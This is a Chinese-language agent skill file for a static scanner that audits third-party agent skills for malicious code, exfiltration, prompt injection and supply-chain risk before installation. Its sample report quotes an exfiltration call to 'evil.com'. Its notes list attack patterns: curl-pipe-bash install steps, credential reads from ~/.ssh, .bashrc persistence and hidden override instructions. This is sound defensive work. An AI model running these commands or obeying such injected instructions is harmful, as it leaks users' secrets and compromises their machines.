---
name: agent-skill-security-scanner
title: AI 技能安装前安全扫描
description: 当要安装或评估来自不可信来源的第三方 Agent 技能（本地目录或 git 仓库）时使用；做静态安全审计并产出 PASS/WARN/FAIL 裁决、按严重级分组的发现项与修复建议；不适用于运行时动态沙箱、CVE 实时联网核验、逻辑炸弹/延时载荷检测；触发词：审计这个技能、技能安全扫描、这个技能安全吗、安装前安全检查、技能漏洞扫描、prompt injection 检测、供应链审计、audit this skill、is this skill safe、scan skill for security
domain: 安全/appsec
triggers: [审计这个技能, 技能安全扫描, 这个技能安全吗, 安装前安全检查, 技能漏洞扫描, prompt injection 检测, 供应链审计, audit this skill, is this skill safe, scan skill for security]
tags: [security, appsec, skill-audit, static-analysis, prompt-injection, supply-chain, vulnerability-scan]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [python3, skill_security_auditor.py, git, re (regex 静态扫描)]
requires: []
related: [agentic-actions-auditor, supply-chain-risk-auditor, dependency-auditor, security-antipattern-hook]
combines_with: [supply-chain-risk-auditor, dependency-auditor, false-positive-check]
license: MIT
source: alirezarezvani/claude-skills
source_license: MIT
---
## 何时使用

- 安装一个来自不可信来源的 Agent 技能前，需要先做安全闸门（适用于 Claude Code 插件、OpenClaw / Codex 技能等）。
- 审计一个技能目录或 git 仓库 URL，排查恶意代码、数据外泄、提示注入、供应链风险。
- 重点排查 Python/Bash/JS 脚本中的危险模式（`os.system`、`eval`、`subprocess(shell=True)`、网络外泄等），以及 SKILL.md 中的提示注入。

不该用的边界：
- 不做运行时动态分析或沙箱执行，只做静态正则扫描。能查不到运行时动态生成的载荷、逻辑炸弹、延时/条件触发的后门。
- 不联网核验 CVE，依赖漏洞与 typosquatting 用的是本地内置模式，并非实时数据库。
- 网络目标信誉、语义意图无法判定，借此结果做最终“安全/不安全”定论前仍需人工复核边界情形。

## 步骤

1. 对技能目录或仓库 URL 运行扫描器。
2. 按严重级（CRITICAL > HIGH > INFO）从高到低审阅发现项。
3. 依据裁决决策：
   - PASS（无 critical/high）：可安装。
   - WARN（有 high/medium）：人工复核后再安装。
   - FAIL（有 critical）：不要安装，先整改。
4. 逐条按 fix 字段整改；存疑则不安装，向作者求证。

四个扫描维度：

1. 代码执行风险（`.py/.sh/.bash/.js/.ts`）：命令注入、`eval/exec/__import__`、base64/hex/`chr()` 链混淆、`requests.post`/`socket`/`httpx` 等外泄、凭据读取（`~/.ssh`、`~/.aws`、敏感环境变量）、写系统目录/shell 配置、`sudo`/`chmod 777`/SUID/crontab 提权、`pickle.loads`/`yaml.load` 不安全反序列化。
2. SKILL.md 与所有 `.md` 的提示注入：覆盖先前指令、角色劫持、绕过安全检查、零宽字符/HTML 注释隐藏指令、越权请求、外泄数据指令。
3. 供应链：`requirements.txt`/`package.json`/内联 `pip install` 的 typosquatting（如 `reqeusts`）、未锁定版本、运行时安装。
4. 文件系统与结构：越界路径、`.env`/隐藏文件、二进制（`.exe/.so/.dll`）、>1MB 大文件、指向目录外的符号链接、SUID/SGID 位。

## 指令

```bash
# 审计本地技能目录
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# 审计 git 仓库中的某个技能（克隆后审计，--cleanup 自动清理临时目录）
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name --cleanup

# 严格模式（任何 WARN 升级为 FAIL，用于 CI 闸门）
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# 输出 JSON 报告（供程序消费 / 入库）
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

退出码契约：`0=PASS`（安全）、`1=FAIL`（有 critical，或 `--strict` 下的 WARN）、`2=WARN`（建议人工复核）。

抑制误报：在该行加入 `# noqa: SEC-AUDITOR` 或 `auditor:ignore-line`，扫描器会跳过该行（安全工具自身引用危险模式串时用得到）。

CI/CD 集成示例（GitHub Actions）：

```yaml
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

## 示例

报告（FAIL）节选：

```
🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: 从不可信输入执行任意代码
   Fix: 用 ast.literal_eval() 或显式解析替代 eval()

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: 向外部服务器外泄数据
   Fix: 移除出站网络调用，或核验目标可信

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: 未锁定版本可能引入有漏洞的版本
   Fix: 锁定具体版本：requests==2.31.0
```

典型攻击模式（用于人工复核取证）：base64 解码 + `exec` 组合的混淆载荷；markdown 中 `curl ... | bash` 的“安装前置步骤”提示注入；`requirements.txt` 里夹带 typosquatting 包；`scripts/setup.sh` 向 `~/.bashrc` 追加内容做持久化。

## 注意事项

- 静态扫描只是闸门，不替代人工复核与运行时监控；存疑就不装。
- 关注全部代码路径上的出站 HTTP，而非仅显眼位置（“有用的后门”常 `try/except: pass` 静默外泄）。
- 任何编码/解码（base64、hex、`chr()` 链）即便单独看无害，也应标记并人工解码核验。
- 给作者的合规建议：用 `subprocess.run()` 列表参数（禁 `shell=True`）、精确锁定依赖版本、文件操作限定在技能目录内、用 `json.loads`/`yaml.safe_load`、不访问凭据与敏感环境变量、不改 shell/cron/系统文件、不内置二进制与符号链接。可在 frontmatter 加 `security:` 元数据（network/filesystem/credentials/permissions）声明安全态势。

## 互见

- code-reviewer：对脚本逻辑做更广义的代码审查，与本条的危险模式静态扫描互补。
- dependency-auditor：聚焦依赖供应链与已知漏洞的深度核验，承接本条的 typosquatting/未锁版本发现。
- skill-creator：创建技能时即按本条的安全约束（无 `eval`、锁版本、目录边界内）落地，可在产出后用本条做安装前闸门。

本条采编自 alirezarezvani/claude-skills（MIT）。
